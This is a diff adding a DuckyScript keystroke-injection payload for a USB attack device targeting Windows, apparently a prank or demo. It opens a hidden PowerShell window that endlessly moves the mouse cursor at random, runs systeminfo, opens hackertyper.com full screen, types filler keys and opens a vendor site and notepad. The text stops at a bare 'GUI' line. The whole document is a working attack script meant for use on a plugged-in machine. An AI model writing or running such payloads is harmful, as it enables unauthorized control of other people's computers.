@@ -1,0 +1,35 @@
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -w h -c "Add-Type -Assembly System.Windows.Forms;while(1){$p=[System.Windows.Forms.Cursor]::Position;$p.X+=(-300..300|Get-Random);$p.Y+=(-300..300|Get-Random);[System.Windows.Forms.Cursor]::Position=$p;sleep -m 20}"
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING cmd
+ENTER
+DELAY 3000
+STRING systeminfo
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING https://hackertyper.com
+ENTER
+DELAY 3000
+FN F11
+DELAY 300
+STRING qwertyuiopasdfghjklzxcvbnm
+REPEAT 50
+DELAY 500
+GUI r
+DELAY 500
+STRING https://www.infishark.com
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING notepad.exe
+ENTER
+DELAY 500
+GUI
